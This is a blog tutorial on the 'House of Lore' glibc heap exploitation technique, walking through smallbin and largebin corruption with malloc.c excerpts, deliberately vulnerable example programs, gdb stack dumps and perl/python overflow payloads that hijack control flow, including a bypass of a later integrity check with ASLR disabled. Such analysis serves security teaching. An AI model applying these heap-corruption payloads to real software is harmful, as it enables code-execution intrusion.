原文 by [gbmaster](https://gbmaster.wordpress.com)  

## THE HOUSE OF LORE

When the “Malloc Maleficarum” was published, as it was a purely theoretical article, contained no real exploit implementations or practical examples. Things got a little bit better with blackngel’s “[Malloc Des-Maleficarum](http://phrack.org/issues/66/10.html)“, in which the author tried to analyze how this technique should be applied, but he wasn’t able to provide, again, any practical example. He did it, at last, in his Phrack’s article “[The House of Lore: Reloaded ptmalloc v2 & v3: Analysis & Corruption](http://phrack.org/issues/67/8.html)“, in which he got managed to explore both the corruption of small and large bins in order to be able to control the return value of a malloc() call. The common point between the smallbin and the largebin’s corruption is to overwrite the metadata of a chunk previously processed by the free() function.  

### SMALLBIN CORRUPTION  

Ingredients:  

* Two chunks are allocated and the first one is overflowable  
* The second chunk is freed
* Another (potentially more) chunk, bigger than the second one, is allocated
* A new chunk with the same size of the second one is allocated
* Another chunk with the same size of the second one is allocated
* The glibc’s code (as usual, version 2.3.5) blamed for this bug starts at line #[3866](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e3ccbde7b5b84affbf6ff2387a5151310235f0a3;hb=1afdd17390f6febdfe559e16dfc5c5718f8934aa#l3866):

``` c
 Void_t*
_int_malloc(mstate av, size_t bytes)
{
  [...]

  checked_request2size(bytes, nb);

  [...]

  if ((unsigned long)(nb) <= (unsigned long)(av->max_fast)) {
    [...]
  }

  [...]

  /*
    If a small request, check regular bin.  Since these "smallbins"
    hold one size each, no searching within bins is necessary.
    (For a large request, we need to wait until unsorted chunks are
    processed to find best fit. But for small ones, fits are exact
    anyway, so we can check now, which is faster.)
  */

  if (in_smallbin_range(nb)) {
    idx = smallbin_index(nb);
    bin = bin_at(av,idx);

    if ( (victim = last(bin)) != bin) {
      if (victim == 0) /* initialization check */
        malloc_consolidate(av);
      else {
        bck = victim->bk;
        set_inuse_bit_at_offset(victim, nb);
        bin->bk = bck;
        bck->fd = bin;

        if (av != &main_arena)
	  victim->size |= NON_MAIN_ARENA;
        check_malloced_chunk(av, victim, nb);
        return chunk2mem(victim);
      }
    }
  }
```
Reaching this code requires that the malloc() call requests more than the fastbin’s size, which is set, by default to 72 bytes (we’re talking here about the normalized size). Provided this, the in_smallbin_range just checks that the request meets the smallbins requirements: its size must be less than MIN_LARGE_SIZE (set, by default, to 512 bytes).  

Phantasmal remembered us that：  
> when a chunk is freed, it isn’t directly put into its corresponding bin, but it stays into a kind-of limbo: the “unsorted chunk” bin. This bin is like a stack implemented as a doubly linked list and it’s used to potentially satisfy a subsequent malloc() request if the request matches the size of the unsorted-chunk’ed chunk. **If it doesn’t, then the chunk is moved to its respective bin**.  
 
This whole thing is done for performance purposes. So, for this exploitation technique to work, it is necessary that the chunk is put back into the bin: it means that another malloc() request must be performed after the chunk is freed and before the first chunk is filled with overflowing data. Also, the request must be for a bigger size of data than the freed chunk.  

So, the code will try to check if there’s a chunk fitting the request into the smallbins by using the idx = smallbin_index(nb) and the bin = bin_at(av,idx) macros. The last(b) macro just returns the bk pointer of the chunk. If there were no available chunks, then the bk pointer would point to its own chunk. But if there is an available chunk (as we know there is), then the unlinking code is reached.   

1. `bck = victim->bk`: bck points to the penultimate chunk   
2. `bin->bk = bck`: bck is now the last chunk  
3. `bck->fd = bin`: fd points to the new last chunk: **this step requires that victim->bk points to an area of writable memory**    

One important thing should be kept in mind: when a chunk is taken from the “unsorted chunk” bin and put into its bin, it’s put as the first element. As we saw from the code, the last() macro will always take the last one. It might be necessary to perform several malloc() calls in order to have our freed chunk at the last place in the bin.  

The resulting chunk is then transformed into a pointer by using the usual chunk2mem(victim) macro. Phantasmal said that the key for the Lore is to control the bin->bk: that’s why it is required that there is already a free chunk in the list, as a following overflow of the first chunk would overwrite the victim’s bk pointer.  

After doing this, of course, the same freed chunk is returned by the malloc(). A subsequent request would re-perform the same exact steps, BUT, this time, even if the bin is empty, its bk pointer won’t point to the bin itself (as the previous step overwrote that pointer) and the allocator will think that there’s still one chunk inside. It’s important to remember that, again, victim->bk must point to a writable location. What happens next is pretty obvious: the malloc() function will return a chunk located at the value the original bk was overwritten with, plus 8 bytes. If bk was overwritten with a value pointing at the stack, well…  

blackngel provided an example, matching all the requirements of the smallbin corruption approach:  
``` c
 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

void evil_func(void)
{
  printf("\nThis is an evil function. You become a cool hacker if you are able to execute it.\n");
}

void func1(void)
{
  char *lb1, *lb2;

  lb1 = (char *) malloc(128);
  printf("LB1 -> [ %p ]", lb1);
  lb2 = (char *) malloc(128);
  printf("\nLB2 -> [ %p ]", lb2);

  strcpy(lb1, "Which is your favourite hobby? ");
  printf("\n%s", lb1);
  fgets(lb2, 128, stdin);
}

int main(int argc, char *argv[])
{
  char *buff1, *buff2, *buff3;

  malloc(4056);
  buff1 = (char *) malloc(16);
  printf("\nBuff1 -> [ %p ]", buff1);
  buff2 = (char *) malloc(128);
  printf("\nBuff2 -> [ %p ]", buff2);
  buff3 = (char *) malloc(256);
  printf("\nBuff3 -> [ %p ]\n", buff3);

  free(buff2);

  printf("\nBuff4 -> [ %p ]\n", malloc(1423));

  strcpy(buff1, argv[1]);

  func1();

  return 0;
}
```
As you can see, all the steps previously discussed are reported into this piece of code: the goal is to execute the evil_func() function. The idea is to overwrite buff2->bk by overflowing buff1 at strcpy time and to have lb2 pointing at the return value in the stack: at this point, it suffices just to input a new value for it at fgets() time.  

By reading blackngel’s last paper, it’s easy to follow the steps he performed to write a working exploit. First thing, he needed the evil_func()‘s return address location, which happened to be at 0xBFFFF35C. When choosing the value to overwrite bk with, he wrote in the paper the status of the stack at the beginning of func1:  
```
 (gdb) x/16x $ebp-32
0xbffff338:     0x00000000      0x00000000      0xbffff388      0x00743fc0
0xbffff348:     0x00251340      0x00182a20      0x00000000      0x00000000
0xbffff358:     0xbffff388      0x08048d1e      0x0804ffe8      0xbffff5d7
0xbffff368:     0x0804c0b0      0xbffff388      0x0013f345      0x08050088

EBP -> 0xBFFFF358
RET -> 0xBFFFF35C
```
He said he chose 0xBFFFF33C for the overwriting process, but, in my opinion, this makes no sense, as, using that value, means that:  

1. During the first malloc() call inside func1, bck points at 0xBFFFF348
2. When trying to access to bck->fd, it will fail, as it’s likely that 0x00251340 (the content of 0xBFFFF348) is not a valid memory address  

So, I think he either meant to write 0xBFFFF34C or he reported a wrong stack layout. Let’s say that the stack dump is OK and that 0xBFFFF34C will be used: during the first call bck will point at 0xBFFFF358 and, when trying to access to bck->fd, everything will work fine, as 0xBFFFF390 (0xBFFFF388 + 8) is writable.  

When the second malloc() request is performed, victim will be equal to 0xBFFFF34C and victim->bk to 0xBFFFF388 (an address with valid write permissions). At the end, the allocator will return 0xBFFFF354 (8 bytes before the return address in the stack).  

> The values I computed and blackngel’s ones differ by 0x00000010. I really hope I got this one right.

So, what’s left is the computation of the new return address, which, in blackngel’s own scenario, happened to be at 0x08048BA4    

When he put everything’s together, what he got is (I slightly adapted his output):  
```
 black@odisea:~$ perl -e 'print "BBBBBBBB". "\xa4\x8b\x04\x08"' > evil.in  

...

(gdb) run `perl -e 'print "A"x28 . "\x4c\xf3\xff\xbf"'` < evil.in

Buff1 -> [ 0x804ffe8 ]
Buff2 -> [ 0x8050000 ]
Buff3 -> [ 0x8050088 ]

Buff4 -> [ 0x8050190 ]
LB1 -> [ 0x8050000 ]
LB2 -> [ 0xbffff344 ]

Which is your favourite hobby?  

This is an evil function. You become a cool hacker if you are able to execute it.  

Program received signal SIGSEGV, Segmentation fault.  

0x08048bb7 in evil_func ()
(gdb)
```
In 2009, this vulnerability was patched with this [commit](https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=f6887a0d9a55f5c80c567d9cb153c1c6582410f9), which checks the usual consistency between the pointers of the list. At this point, blackngel gives a great hint:  

> This check can still be overcome if you control an area into the stack and you can write an integer such that its value is equal to the address of the recently free chunk (victim). This must happen before the next call to malloc( ) with the same size requested.  

I tried to do this, but I found out that it’s not the only thing required: in fact you need to be able to control three integer values inside the func1 stack frame. However, yes, with this additional requirement, it’s possible to have the House of Lore even with glibc 2.20. What I did is to modify the func1 in the following way:  
``` c
 void func1()
{
  char *lb1, *lb2;

  unsigned int a = 0xAAAAAAAA;
  unsigned int b = 0xBBBBBBBB;
  unsigned int c = 0xCCCCCCCC;

  lb1 = (char *) malloc(128);
  printf("LB1 -> [ %p ]", lb1);
  lb2 = (char *) malloc(128);
  printf("\nLB2 -> [ %p ]", lb2);

  strcpy(lb1, "Which is your favourite hobby? ");
  printf("\n%s", lb1);
  fgets(lb2, 128, stdin);
}
```
Yes, I know that manually setting the values inside the code itself is not a clean way of doing things, but I didn’t want to waste too much time by writing fgets and conversions from ASCII to integers. The concept still stays.  
The first thing to do is to overwrite victim‘s bk pointer in such a way that bck‘s fd value is located where a is. In order to do this, we need a layout of func1‘s stack.  
``` 
 (gdb) x/20x 0xffffcf30
0xffffcf30:	0xf7e5d000	0x00000000	0x0804860c	0x00000080
0xffffcf40:	0xaaaaaaaa	0xbbbbbbbb	0xcccccccc	0x00000000
0xffffcf50:	0x0804874b	0xffffcf68	0x08048753	0x0804bfe8
0xffffcf60:	0x0804c000	0x0804c088	0x00000000	0xf7cdd943
0xffffcf70:	0x00000002	0xffffd004	0xffffd010	0xf7feb05e

RET -> 0xFFFFCF58
```
In order to have bck‘s fd field located at 0xFFFFCF40 we need to overwrite victim‘s bk with 0xFFFFCF38.  
```
 $ ./hol `python -c 'import sys; sys.stdout.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x38\xCF\xFF\xFF

Buff1 -> [ 0x804bfe8 ]
Buff2 -> [ 0x804c000 ]
Buff3 -> [ 0x804c088 ]

Buff4 -> [ 0x804c190 ]
*** Error in `./hol': malloc(): smallbin double linked list corrupted: 0x0804c000 ***
```
In order to pass the check, the a variable must be set to 0x0804C000’s chunk: 0x0804BFF8. This will make the first malloc() call to correctly return the old buff2‘s address. When the malloc() is called again, this check will be performed again and we need to handle this situation. In this new scenario, victim will be set at 0xFFFFCF38 and its bk will be, of course, located where b is stored. This variable must store the address of a fake chunk in such a way that its fd field lies on c: 0xFFFFCF40. Of course, c must be set as well to the same value of the victim: 0xFFFFCF38.  
The updated code will look like:  
``` c
 void func1()
{
  char *lb1, *lb2;

  unsigned int a = 0x0804BFF8;
  unsigned int b = 0xFFFFCF40;
  unsigned int c = 0xFFFFCF38;

  [...]
```
Trying to run this one, will result into a correct allocation of both lb1 and lb2: the latter points, on my machine, at 0xFFFFCF40. As the address of evil_func is 0x080485D5, the payload can be generated with the following command:  

 `python -c 'import sys; sys.stdout.write("B4 + "\xD5\x85\x04\x08")' > payload`
Putting this altogether and running it, gives the expected result:  
```
 $ ./hol `python -c 'import sys; sys.stdout.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x38\xCF\xFF\xFF< payload

Buff1 -> [ 0x804bfe8 ]
Buff2 -> [ 0x804c000 ]
Buff3 -> [ 0x804c088 ]

Buff4 -> [ 0x804c190 ]
LB1 -> [ 0x804c000 ]
LB2 -> [ 0xffffcf40 ]
Which is your favourite hobby? 
This is an evil function. You become a cool hacker if you are able to execute it.
Segmentation fault
```
Mission accomplished. Useless to say that ASLR was disabled during this exploitation.  

It’s time to give a look at the alternative recipe for this attack:  

## LARGEBIN CORRUPTION

Ingredients:  

* Two chunks are allocated and the first one is overflowable
* The second chunk is freed
* Another (potentially more) chunk, bigger than the second one, is allocated
* A new chunk smaller than the second one is allocated
* Another chunk with the same previous size is allocated
* The idea here is the same: corrupting the bk value of the freed chunk. The code involved into this corruption starts at line #[3912](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e3ccbde7b5b84affbf6ff2387a5151310235f0a3;hb=1afdd17390f6febdfe559e16dfc5c5718f8934aa#l3912):  

``` c
 /*
  Process recently freed or remaindered chunks, taking one only if
  it is exact fit, or, if this a small request, the chunk is remainder from
  the most recent non-exact fit.  Place other traversed chunks in
  bins.  Note that this step is the only place in any routine where
  chunks are placed in bins.

  The outer loop here is needed because we might not realize until
  near the end of malloc that we should have consolidated, so must
  do so and retry. This happens at most once, and only when we would
  otherwise need to expand memory to service a "small" request.
*/

for(;;) {

  while ( (victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) {
    ...
  }

  /*
    If a large request, scan through the chunks of current bin in
    sorted order to find smallest that fits.  This is the only step
    where an unbounded number of chunks might be scanned without doing
    anything useful with them. However the lists tend to be short.
  */

  if (!in_smallbin_range(nb)) {
    bin = bin_at(av, idx);

    /* skip scan if empty or largest chunk is too small */
    if ((victim = last(bin)) != bin &&
        (unsigned long)(first(bin)->size) >= (unsigned long)(nb)) {

      while (((unsigned long)(size = chunksize(victim)) <
              (unsigned long)(nb)))
        victim = victim->bk;

      remainder_size = size - nb;
      unlink(victim, bck, fwd);
      [...]
    }
  }

  /*
    Search for a chunk by scanning bins, starting with next largest
    bin. This search is strictly by best-fit; i.e., the smallest
    (with ties going to approximately the least recently used) chunk
    that fits is selected.

    The bitmap avoids needing to check that most blocks are nonempty.
    The particular case of skipping all bins during warm-up phases
    when no chunks have been returned yet is faster than it might look.
  */

  ++idx;
  bin = bin_at(av,idx);
  [...]

  for (;;) {
    [...]
    /* Inspect the bin. It is likely to be non-empty */
    victim = last(bin);

    /*  If a false alarm (empty bin), clear the bit. */
    if (victim == bin) {
      [...]
    }

    else {
      size = chunksize(victim);

      /*  We know the first chunk in this bin is big enough to use. */
      assert((unsigned long)(size) >= (unsigned long)(nb));

      remainder_size = size - nb;

      /* unlink */
      bck = victim->bk;
      bin->bk = bck;
      bck->fd = bin;

      /* Exhaust */
      if (remainder_size < MINSIZE) {
        [...]
        return chunk2mem(victim);
      }

      /* Split */
      else {
        [...]
        set_foot(remainder, remainder_size);
        check_malloced_chunk(av, victim, nb);
        return chunk2mem(victim);
      }
    }
  }
  [...]
}
```
The first thing to keep in mind is that, reaching this code, requires to perform an allocation request for more than 512 bytes (otherwise, smallbins will be used).  
If the initial while loop is correctly passed, it means that the freed chunk has been put in its largebin. This step can be obtained by allocating, as in the smallbin scenario, a bigger chunk after freeing the second chunk.  

Requesting an allocation of the same size of the freed chunk would trigger a block of code searching the corresponding bin for a chunk, returning the overflowed chunk. Anyway, this piece of could would use the unlink() macro to remove this chunk from the bin, ruining everything. This means that a smaller request must be performed, or, as Phantasmal Phantasmagoria said, “512 < M < N”, where N is the size of the freed chunk and M is the request we’re talking about now. If no chunks are found fitting the request of size M, malloc() will iterate through the bins until a fulfilling one is found.  

The victim chunk will be, as usual, the last one of the bin and, in our case, it’ll be the overflowed chunk. But this code really resembles the smallbin’s one. And it actually does: the chunk is unlinked from the list without using the macro. The only difference is that set_foot call, as it tends to go segmentation faulting when exploiting this vulnerability without taking the right precautions. In fact, remainder_size is computed from victim->size, which is filled with random data if using the smallbin’s exploit. If the application allows to insert 0x00 bytes, then it would be possible to provide a correct value (remainder_size must be less than MINSIZE) in the attack string and the segmentation fault would be avoided.  

blackngel’s rewrote his application example in order to match these new requirements:  
``` c
 #include <stdlib.h>
#include <stdio.h>
#include <string.h>

void evil_func(void)
{
  printf("\nThis is an evil function. You become a cool hacker if you are able to execute it\n");
}

void func1(void)
{
  char *lb1, *lb2;

  lb1 = (char *) malloc(1536);
  printf("\nLB1 -> [ %p ]", lb1);
  lb2 = malloc(1536);
  printf("\nLB2 -> [ %p ]", lb2);

  strcpy(lb1, "Which is your favourite hobby: ");
  printf("\n%s", lb1);
  fgets(lb2, 128, stdin);
}

int main(int argc, char *argv[])
{
  char *buff1, *buff2, *buff3;

  malloc(4096);
  buff1 = (char *) malloc(1024);
  printf("\nBuff1 -> [ %p ]", buff1);
  buff2 = (char *) malloc(2048);
  printf("\nBuff2 -> [ %p ]", buff2);
  buff3 = (char *) malloc(4096);
  printf("\nBuff3 -> [ %p ]\n", buff3);

  free(buff2);

  printf("\nBuff4 -> [ %p ]", malloc(4096));

  strcpy(buff1, argv[1]);

  func1();

  return 0;
}
```
As you can see, the code is more or less the same: just the allocation requests changed. He just had to cheat a little bit for the 0x00 bytes insertion with gdb. Anyway, adjusting the code a little bit could allow to input those particular bytes.  

However, this corruption approach didn’t last too much and a [patch](https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=7ecfbd386a340b52b6491f47fcf37f236cc5eaf1) for glibc was provided in version 2.6: the unlink macro is now used also in this branch.  

This is all I had to say about the House of Lore. Quite interesting, I’d say, even if only the smallbin version is still exploitable. However, the number of requirements in order to perform this kind of attack is pretty high, and I don’t know how many scenarios could actually fall in this category.  